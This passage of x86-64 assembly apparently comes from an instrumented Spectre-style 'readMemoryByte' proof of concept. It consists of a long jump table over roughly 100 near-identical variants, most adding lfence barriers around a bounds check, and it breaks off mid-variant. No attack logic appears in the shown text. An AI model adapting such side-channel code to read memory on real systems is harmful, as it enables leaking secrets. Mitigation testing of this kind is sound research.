	cmpl	$18, %eax
	je	.LreadMemoryByte_win2_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win2_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win2_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win2_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win2_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win2_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win2_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win2_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win2_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win2_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win2_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win2_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win2_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win2_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win2_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win2_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win2_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win2_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win2_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win2_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win2_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win2_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win2_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win2_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win2_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win2_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win2_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win2_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win2_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win2_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win2_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win2_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win2_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win2_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win2_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win2_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win2_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win2_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win2_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win2_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win2_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win2_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win2_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win2_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win2_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win2_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win2_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win2_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win2_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win2_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win2_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win2_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win2_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win2_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win2_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win2_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win2_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win2_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win2_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win2_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win2_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win2_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win2_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win2_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win2_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win2_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win2_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win2_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win2_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win2_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win2_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win2_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win2_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win2_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win2_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win2_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win2_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win2_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win2_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win2_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win2_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win2_var99
	jmp	.LreadMemoryByte_win2_var0
## Variant 0
.LreadMemoryByte_win2_var0:
	popq	%rax
	cmpl	$255, -96(%rbp)
	jle	.L24
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 1
.LreadMemoryByte_win2_var1:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 2
.LreadMemoryByte_win2_var2:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 3
.LreadMemoryByte_win2_var3:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 4
.LreadMemoryByte_win2_var4:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 5
.LreadMemoryByte_win2_var5:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 6
.LreadMemoryByte_win2_var6:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 7
.LreadMemoryByte_win2_var7:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 8
.LreadMemoryByte_win2_var8:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 9
.LreadMemoryByte_win2_var9:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 10
.LreadMemoryByte_win2_var10:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 11
.LreadMemoryByte_win2_var11:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 12
.LreadMemoryByte_win2_var12:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 13
.LreadMemoryByte_win2_var13:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 14
.LreadMemoryByte_win2_var14:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 15
.LreadMemoryByte_win2_var15:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 16
.LreadMemoryByte_win2_var16:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 17
.LreadMemoryByte_win2_var17:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 18
.LreadMemoryByte_win2_var18:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 19
.LreadMemoryByte_win2_var19:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 20
.LreadMemoryByte_win2_var20:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 21
.LreadMemoryByte_win2_var21:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 22
.LreadMemoryByte_win2_var22:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 23
.LreadMemoryByte_win2_var23:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 24
.LreadMemoryByte_win2_var24:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 25
.LreadMemoryByte_win2_var25:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 26
.LreadMemoryByte_win2_var26:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 27
.LreadMemoryByte_win2_var27:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 28
.LreadMemoryByte_win2_var28:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 29
.LreadMemoryByte_win2_var29:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 30
.LreadMemoryByte_win2_var30:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 31
.LreadMemoryByte_win2_var31:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 32
.LreadMemoryByte_win2_var32:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 33
.LreadMemoryByte_win2_var33:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 34
.LreadMemoryByte_win2_var34:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 35
.LreadMemoryByte_win2_var35:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 36
.LreadMemoryByte_win2_var36:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 37
.LreadMemoryByte_win2_var37:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 38
.LreadMemoryByte_win2_var38:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 39
.LreadMemoryByte_win2_var39:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 40
.LreadMemoryByte_win2_var40:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 41
.LreadMemoryByte_win2_var41:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 42
.LreadMemoryByte_win2_var42:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 43
.LreadMemoryByte_win2_var43:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 44
.LreadMemoryByte_win2_var44:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 45
.LreadMemoryByte_win2_var45:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 46
.LreadMemoryByte_win2_var46:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 47
.LreadMemoryByte_win2_var47:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 48
.LreadMemoryByte_win2_var48:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 49
.LreadMemoryByte_win2_var49:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 50
.LreadMemoryByte_win2_var50:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 51
.LreadMemoryByte_win2_var51:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 52
.LreadMemoryByte_win2_var52:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 53
.LreadMemoryByte_win2_var53:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 54
.LreadMemoryByte_win2_var54:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 55
.LreadMemoryByte_win2_var55:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 56
.LreadMemoryByte_win2_var56:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 57
.LreadMemoryByte_win2_var57:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 58
.LreadMemoryByte_win2_var58:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 59
.LreadMemoryByte_win2_var59:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 60
.LreadMemoryByte_win2_var60:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 61
.LreadMemoryByte_win2_var61:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 62
.LreadMemoryByte_win2_var62:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 63
.LreadMemoryByte_win2_var63:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 64
.LreadMemoryByte_win2_var64:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 65
.LreadMemoryByte_win2_var65:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 66
.LreadMemoryByte_win2_var66:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 67
.LreadMemoryByte_win2_var67:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 68
.LreadMemoryByte_win2_var68:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 69
.LreadMemoryByte_win2_var69:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 70
.LreadMemoryByte_win2_var70:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 71
.LreadMemoryByte_win2_var71:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 72
.LreadMemoryByte_win2_var72:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 73
.LreadMemoryByte_win2_var73:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
